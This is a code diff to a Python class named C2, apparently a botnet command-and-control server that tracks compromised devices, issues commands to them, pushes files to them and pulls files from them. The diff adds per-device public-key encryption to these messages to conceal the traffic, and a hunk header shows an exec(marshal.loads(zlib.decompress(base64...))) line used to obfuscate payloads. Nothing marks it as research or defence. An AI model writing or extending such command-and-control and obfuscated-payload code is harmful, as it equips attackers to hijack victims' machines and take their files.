@@ -13,7 +13,7 @@ import time
 import geocoder
 import ipaddress
 import threading
-from encryption import encrypt_messages
+from encryption import encrypt_messages, encrypt_message_with_device_key
 
 class C2:
     def __init__(self, sio, keys):
@@ -173,7 +173,11 @@ class C2:
         return self.total_devices
 
     def send_command(self, sid, data):
-        self.sio.emit("command", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("command", encrypted_data, to=sid)
 
     def get_result(self, sid, data):
         for device in self.devices:
@@ -371,18 +375,25 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             print("file encoded")
 
         for uid in uids:
-            self.sio.emit(
-                "upload_file",
-                {"uid": uid, "file_name": file.filename, "file": base64_encoded},
-                to=self.devices[uid]["sid"]
-            )
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, {
+                "uid": uid,
+                "file_name": file.filename,
+                "file": base64_encoded
+            })
+            self.sio.emit("upload_file", encrypted_data, to=self.devices[uid]["sid"])
 
     def download_file(self, data):
         print(data)
         file_path = data["file_path"]
 
         for uid in data["uids"]:
-            self.sio.emit("download_file", {"uid": uid, "file_path": file_path})
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, {
+                "uid": uid,
+                "file_path": file_path
+            })
+            self.sio.emit("download_file", encrypted_data, to=self.devices[uid]["sid"])
 
     def save_file(self, sid, data):
         data = json.loads(decrypt(data))
